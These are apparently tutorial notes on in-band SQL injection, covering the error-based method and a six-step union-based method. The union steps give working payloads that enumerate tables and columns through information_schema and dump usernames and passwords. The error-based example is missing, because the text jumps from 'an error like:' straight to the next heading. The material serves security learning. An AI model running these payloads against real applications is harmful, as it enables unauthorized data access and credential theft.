==**In-Band SQL**== Injection is the most common and easiest-to-exploit category. The term "In-Band" means the same communication channel used to deliver the injection is also used to receive the results. You inject through a web request and see the extracted data right there in the page response.

## ==Error-Based SQL Injection==

==Error-Based SQL== Injection exploits database error messages displayed to the user. When a web application is misconfigured and shows raw database errors, these messages often leak valuable information about the query structure, table names, and even data.

For example, injecting a single quote `'` into a vulnerable parameter might produce an error like:
## ==Union-Based SQL Injection==

**Step 1: Determine the number of columns.** The `UNION` operator requires that both queries have the same number of columns. You discover this by injecting `UNION SELECT` with an incrementing number of values until the error disappears:

```sql
1 UNION SELECT 1          -- error (wrong column count)
1 UNION SELECT 1,2        -- error (still wrong)
1 UNION SELECT 1,2,3      -- success! The table has 3 columns
```

**Step 2: Identify which columns are displayed.** Not all columns may be rendered on the page. Change the original query's value to something that returns no results (like `0`), so only the `UNION` output is displayed:

```sql
0 UNION SELECT 1,2,3
```

The numbers that appear on the page output tell you which column positions you can use for data extraction. If  `3` appears in the content area, that is your extraction column.

**Step 3: Extract the database name.** Replace the visible column position with the `database()` function:

```sql
0 UNION SELECT 1,2,database()
```

This reveals the current database name — the first piece of the puzzle.

**Step 4 — Enumerate tables.** Use `information_schema.tables` to list all tables in the target database:

```sql
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'database_name'
```

**Step 5: Enumerate columns.** Once you've identified an interesting table, get its column names:

```sql
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'target_table'
```

**Step 6: Extract data.** With the table and column names known, extract the actual data:

```sql
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM target_table
```

This returns all usernames and passwords in a readable format.